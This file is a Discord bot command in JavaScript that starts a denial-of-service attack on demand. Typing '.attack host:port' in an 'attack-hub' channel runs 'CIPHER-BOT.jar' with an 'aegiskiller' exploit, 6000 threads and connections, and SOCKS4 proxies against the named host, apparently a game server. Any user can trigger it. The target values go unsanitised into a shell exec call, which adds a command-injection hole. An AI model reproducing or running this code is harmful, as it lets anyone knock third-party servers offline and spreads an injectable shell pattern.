const Discord = require("discord.js");


exports.run = async (client, message, args) => {


  if(message.channel.name == "〔💣〕attack-hub"){

const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)

if(!port)
return message.channel.send("〔💥〕Usage: .attack <host>:<port>")

if(!host)
return message.channel.send("〔💥〕Usage: .attack <host>:<port>")

var exec = require('child_process').exec



exec('java -jar CIPHER-BOT.jar host=' + host + ' port=' + port +  ' protocol=47 exploit=aegiskiller proxiesFile=socks4.txt srvResolve=false srvResolve2=false threads=6000 timeout=500 attackTime=60 connections=6000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true', (error, stdout, stderr) => {
});

 message.channel.send("〔💥〕Starting attack...");
  message.channel.send("〔💥〕Attack sent to **" + host + "**" + " with **" + port +"** port!");
  } else {
        message.channel.send("〔💥〕You cannot run that here")

  }


  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'BigPayload',
  usage: 'attack'
}
